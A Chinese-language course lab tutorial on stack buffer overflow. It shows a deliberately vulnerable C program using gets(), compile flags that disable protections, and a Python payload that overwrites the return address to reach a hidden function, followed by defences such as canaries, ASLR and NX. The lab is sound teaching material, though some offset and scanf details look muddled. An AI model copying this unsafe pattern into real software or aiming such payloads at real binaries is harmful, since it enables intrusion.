# 栈溢出攻击实战：劫持程序控制流 (Stack Buffer Overflow)

> **实验目标**：利用 C 语言中不安全的字符串读取函数造成的缓冲区溢出，覆盖栈上的“返回地址（Return Address）”，强制程序跳转到原本永远不会被调用的 `secret_function`。

---

## ⚠️ 免责声明与安全警告 (WARNING)

1. **本实验仅供个人学习计算机系统底层原理（如 CS:APP 课程）使用。**
2. **切勿将本文档中的技术用于任何未经授权的真实系统或网络环境中！**
3. 未经授权利用缓冲区溢出漏洞攻击他人计算机系统属于**严重违法**行为（违反《中华人民共和国网络安全法》等）。请保持敬畏，做一名白帽黑客。
4. 本实验需要手动关闭现代编译器的多项安全保护机制，**仅可在自己编写的沙箱/靶机代码中操作。**

---

## 🛠️ 第一部分：实验环境与代码准备

*   **操作系统**：Linux 64位 (如 Ubuntu / WSL)
*   **编译器**：GCC
*   **调试器**：GDB
*   **脚本语言**：Python 3

### 1. 编写漏洞代码 (`vuln.c`)

```c
#include <stdio.h>

// 目标函数：本不该被正常流程执行
void secret_function() {
    printf("\n[!!!] 成功劫持控制流！你调用了 secret_function!\n");
    printf("这就是栈溢出攻击的威力。\n");
}

// 漏洞函数：使用不安全的 gets()
void vulnerable_function() {
    char buffer[10]; // 只有 10 字节的缓冲区
    printf("请输入一些文本：");
    
    // 致命漏洞：gets() 不检查输入长度
    gets(buffer); 
    
    printf("你输入了: %s\n", buffer);
}

int main() {
    vulnerable_function();
    printf("正常返回 main 函数。\n");
    return 0;
}
```

### 2. 编译代码 (关闭保护机制)

现代系统默认开启保护，我们需要用特定参数将其关闭：

```bash
gcc -g -fno-stack-protector -z execstack -no-pie -std=c99 vuln.c -o vuln
```

*   `-g`: 保留调试符号。
*   `-fno-stack-protector`: 关闭栈保护（金丝雀值）。
*   `-z execstack`: 允许栈上代码执行。
*   `-no-pie`: 关闭 PIE（位置无关代码），让函数地址固定，方便定位。
*   `-std=c99`: 现代 GCC 默认 C 标准已移除 `gets()`，需使用旧标准压制报错。

---

## 🕵️ 第二部分：逆向分析与寻找偏移量

### 1. 寻找目标函数的绝对地址
在终端运行：

```bash
objdump -d vuln | grep secret_function
```

*(假设输出为 `0000000000401176 <secret_function>:`，则记下地址为 `0x401176`)*

### 2. 确定溢出偏移量 (Offset)
这是最容易出错的一步！通常对于 `char buffer[10]`，如果是32位或老版本，可能是 `10 + 8 = 18` 或者栈对齐导致的 `24`。
**最精准的方法是用 GDB 测试：**

```bash
gdb -q ./vuln
(gdb) run < payload.bin
# 程序崩溃后，查看栈顶寄存器：
(gdb) x/8gx $rsp
```

**踩坑记录**：本次实验中，GDB 输出显示 `0x7fff...: 0x1176414141414141`。这说明填充了 18 个 `A` (0x41) 后，正好覆盖到返回地址的低位，目标地址的 `\x76\x11` 已经开始填入。因此，**确定偏移量为 18**。（注：如果你的机器上不是 18，请根据实际 `x/8gx` 看到的 0x41 数量进行调整）。

---

## 💥 第三部分：构建攻击载荷 (Payload)

创建一个 Python 脚本 `exploit.py`：

```python
import struct

# 1. 目标地址（利用 objdump 查出的 secret_function 地址）
target_address = 0x401176

# 2. 构造 payload
# 使用 18 个 'A' 填满 buffer 和保存的 %rbp
payload = b"A" * 18

# 3. 将目标地址转为小端序 (Little-Endian) 的 8 字节机器码
# 注意：必须使用 gets()，因为 scanf("%s") 遇到 \x00 会被截断
payload += struct.pack("<Q", target_address)

# 4. 写入二进制文件（因为不可见字符无法直接通过终端复制）
with open("payload.bin", "wb") as f:
    f.write(payload)
```

在终端运行：`python3 exploit.py`，生成 `payload.bin`。

---

## 🎯 第四部分：实施攻击与结果验证

在终端运行：

```bash
cat payload.bin | ./vuln
```

*(或者使用输入重定向：`./vuln < payload.bin`)*

### 预期输出（完美复现）：

```text
请输入一些文本：你输入了: AAAAAAAAAAAAAAAAAAv@

[!!!] 成功劫持控制流！你调用了 secret_function!
这就是栈溢出攻击的威力。
Segmentation fault (core dumped)
```

**关于最后的 `Segmentation fault`**：
攻击已经**100%成功**！为什么会报段错误？因为 `secret_function` 里面调用了 `printf`，执行完后它也需要执行 `ret`（返回）。但是，原本保存在栈上的 caller（调用者）的返回地址已经被你的一堆 `A` 破坏了，CPU 试图跳转到一个类似 `0x4141414141` 的非法地址，于是引发了段错误。

---

## 🧠 第五部分：深度原理与防御拓展

### 1. 为什么需要“栈对齐 (Stack Alignment)”技巧？
在 x86-64 中，某些 SSE 指令（如 `printf` 内部用到的 `movaps`）要求栈指针 `%rsp` 必须 16 字节对齐。
如果你直接跳转后，发现 `secret_function` 第一行就报段错误（没有打印文字），说明栈歪了。
**解决方案**：在 payload 中先加入一个 `ret` 指令的地址（消耗掉 8 字节，让栈重新对齐），再跳转到 `secret_function`。

### 2. 现代防御机制是如何阻挡你的？(CS:APP 3.10.4 节)
如果把编译命令里的参数去掉（正常编译），你的攻击将失效：
*   **Stack Canary (栈保护)**：在返回地址前插入一个随机值，一旦被 `A` 覆盖，程序退出前检查会报错 `*** stack smashing detected ***` 并终止。
*   **ASLR (地址空间布局随机化)**：每次运行，栈和代码的地址都会变，你根本猜不到 `secret_function` 存在哪里（类似你之前跑的 Stack_random 实验）。
*   **NX/DEP (数据执行保护)**：不允许执行栈内存。进阶黑客会利用 **ROP (返回导向编程)** 来绕过这一机制。